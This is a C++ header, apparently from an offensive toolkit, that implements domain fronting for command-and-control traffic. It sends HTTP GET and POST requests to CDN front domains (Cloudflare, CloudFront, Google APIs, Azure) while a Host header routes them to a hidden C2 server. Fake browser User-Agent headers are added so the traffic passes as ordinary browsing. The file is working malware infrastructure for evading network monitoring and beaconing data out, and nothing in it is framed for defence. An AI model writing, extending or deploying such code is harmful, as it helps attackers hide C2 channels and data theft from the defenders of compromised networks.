#pragma once

#include <string>
#include <curl/curl.h>

namespace nuub::domain {

// Domain fronting - make C2 traffic appear to come from legitimate domain
class DomainFronting {
    std::string front_domain_;      // Domain that appears in SNI/URL
    std::string real_host_;         // Actual C2 server
    int front_port_ = 443;

public:
    // front_domain: appears in DNS/SNI (e.g., "cloudflare.com")
    // real_host: actual C2 server (e.g., "your-c2.com")
    DomainFronting(std::string front_domain, std::string real_host, int port = 443)
        : front_domain_(std::move(front_domain))
        , real_host_(std::move(real_host))
        , front_port_(port) {}

    // Make HTTP request through CDN with domain fronting
    std::string request(const std::string& path, const std::string& data = "") {
        CURL* curl = curl_easy_init();
        if (!curl) return "";

        std::string response;

        // Build URL using front domain
        std::string url = "https://" + front_domain_ + path;

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION,
            +[](char* ptr, size_t size, size_t nmemb, void* userdata) -> size_t {
                auto* resp = static_cast<std::string*>(userdata);
                resp->append(ptr, size * nmemb);
                return size * nmemb;
            });
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

        // Set Host header to real C2 server
        // This is the key: DNS resolves to CDN, but Host header routes to C2
        struct curl_slist* headers = nullptr;
        std::string host_header = "Host: " + real_host_;
        headers = curl_slist_append(headers, host_header.c_str());

        // Add realistic browser headers
        headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.5");
        headers = curl_slist_append(headers, "Connection: keep-alive");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        if (!data.empty()) {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.size());
        }

        curl_easy_perform(curl);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);

        return response;
    }

    // POST request with data
    std::string post(const std::string& path, const std::string& data) {
        CURL* curl = curl_easy_init();
        if (!curl) return "";

        std::string response;
        std::string url = "https://" + front_domain_ + path;

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.size());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION,
            +[](char* ptr, size_t size, size_t nmemb, void* userdata) -> size_t {
                auto* resp = static_cast<std::string*>(userdata);
                resp->append(ptr, size * nmemb);
                return size * nmemb;
            });
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

        struct curl_slist* headers = nullptr;
        headers = curl_slist_append(headers, ("Host: " + real_host_).c_str());
        headers = curl_slist_append(headers, "Content-Type: application/json");
        headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        curl_easy_perform(curl);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);

        return response;
    }

    // Get front domain
    const std::string& front_domain() const { return front_domain_; }
    const std::string& real_host() const { return real_host_; }
};

// Pre-configured fronting configurations
class FrontingProfiles {
public:
    // Use major CDNs as front
    static DomainFronting cloudflare(const std::string& c2_host) {
        return DomainFronting("ajax.cloudflare.com", c2_host);
    }

    static DomainFronting cloudfront(const std::string& c2_host) {
        return DomainFronting("d111111abcdef8.cloudfront.net", c2_host);
    }

    static DomainFronting google(const std::string& c2_host) {
        return DomainFronting("www.googleapis.com", c2_host);
    }

    static DomainFronting azure(const std::string& c2_host) {
        return DomainFronting("blob.core.windows.net", c2_host);
    }
};

} // namespace nuub::domain
